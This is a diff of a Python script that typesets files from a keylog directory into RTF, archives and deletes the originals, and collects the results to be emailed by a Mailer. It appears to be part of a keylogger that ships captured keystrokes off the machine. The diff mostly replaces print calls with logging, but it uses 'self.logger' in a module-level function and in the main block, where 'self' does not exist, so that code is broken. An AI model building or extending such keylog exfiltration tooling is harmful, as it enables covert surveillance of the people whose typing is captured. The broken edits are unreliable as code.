@@ -23,7 +23,7 @@ from textmangler import TextMangler
 class Typesetter():
     
     def __init__(self):
-        self.log = logging.getLogger(__name__)        
+        self.logger = logging.getLogger(__name__)        
         self.rtfFiles = []
         self.loadSettings()
         
@@ -49,7 +49,8 @@ class Typesetter():
                 break;
             return len(self.files) > 0
         except:
-            traceback.print_exc(file=sys.stdout)
+            #traceback.print_exc(file=sys.stdout)
+            self.logger.exception("Exception whilst getting files to typeset")
             return False
         
     def run(self):
@@ -59,26 +60,27 @@ class Typesetter():
                 if self.process() is not None:
                     archive = self.archive(self.files)
                     if archive is not None:
-                        print("Working files archived to " + archive)
+                        self.logger.info("Working files archived to " + archive)
                         return True
                     else:
-                        print("Failed to archive keylog files")
+                        self.logger.info("Failed to archive keylog files")
                 else:
-                    print("Failed to typeset files")
+                    self.logger.info("Failed to typeset files")
             else:
-                print("There are no files in '" + self.keylogDir + "' to typeset")
+                self.logger.info("There are no files in '" + self.keylogDir + "' to typeset")
                 return False
         except:
-            traceback.print_exc(file=sys.stdout)
+            #traceback.print_exc(file=sys.stdout)
+            self.logger.exception("Exception wilst running typesetter")
             return False
 
     def process(self):
         try:
-            print("There are " + str(len(self.files)) + " to typeset")
+            self.logger.info("There are " + str(len(self.files)) + " to typeset")
             # load the files
             for f in self.files:
                 try:
-                    print("Typesetting: " + f)
+                    self.logger.info("Typesetting: " + f)
                     data = ""
                     with open(f, 'r') as content_file:
                         data = content_file.read()
@@ -88,7 +90,7 @@ class Typesetter():
                 
                     doc = self.createRTFDocument(text)
                     if doc is None:
-                        print("Failed to create rtf document")
+                        self.logger.info("Failed to create rtf document")
                         return None;
                     renderer = Renderer()
                 
@@ -100,14 +102,16 @@ class Typesetter():
                     rtfName = os.path.join(self.publishDir, filename + '.rtf')
                         
                     renderer.Write(doc, open(rtfName, 'w'))
-                    print("typeset to RTF document: " + rtfName)
+                    self.logger.info("typeset to RTF document: " + rtfName)
                     self.rtfFiles.append(rtfName)
                 except:
-                    traceback.print_exc(file=sys.stdout)
+                    #traceback.print_exc(file=sys.stdout)
+                    self.logger.exception("Exception whilst processing file")
                     continue
             return self.rtfFiles
         except:
-            traceback.print_exc(file=sys.stdout)
+            self.logger.exception("Exception whilst processing keylogs")
+            #traceback.print_exc(file=sys.stdout)
             return None
         
     def archive(self, files):
@@ -126,10 +130,11 @@ class Typesetter():
                 try:
                     os.remove(f2)
                 except OSError as ose:
-                    print("Failed to delete " + f2 + " due to: " + str(ose))
+                    self.logger.exception("Failed to delete " + f2 + " due to: " + str(ose))
             return target
         except:
-            traceback.print_exc(file=sys.stdout)
+            self.logger.exception("Exception whilst archiving files")
+            #traceback.print_exc(file=sys.stdout)
             return None
         
         
@@ -160,7 +165,8 @@ class Typesetter():
                 section.append(p)
             return doc
         except:
-            traceback.print_exc(file=sys.stdout)
+            #traceback.print_exc(file=sys.stdout)
+            self.logger.exception("Exception whilst creating RTF document")
             return None;
 
 
@@ -179,10 +185,11 @@ def archiveToDir(sentDir, files):
             try:
                 os.remove(f2)
             except OSError as ose:
-                print("Failed to delete " + f2 + " due to: " + str(ose))
+                self.logger.exception("Failed to delete " + f2 + " due to: " + str(ose))
         return target
     except:
-        traceback.print_exc(file=sys.stdout)
+        #traceback.print_exc(file=sys.stdout)
+        self.logger.exception("Exception whilst archiving files to directory")
         return None
 
 if __name__ == "__main__":
@@ -198,7 +205,7 @@ if __name__ == "__main__":
 
     if typesetter.run():        
         # Email files
-        print("Typesetter run successfully")
+        self.logger.info("Typesetter run successfully")
         
     # get all the files in the publish folder and email them
     files = []
@@ -207,7 +214,7 @@ if __name__ == "__main__":
             files.append(os.path.join(dirpath, f))
         break;
     
-    print("There are " + str(len(files)) + " published files to email")
+    self.logger.info("There are " + str(len(files)) + " published files to email")
     if len(files) > 0:
         mailer = Mailer()
         
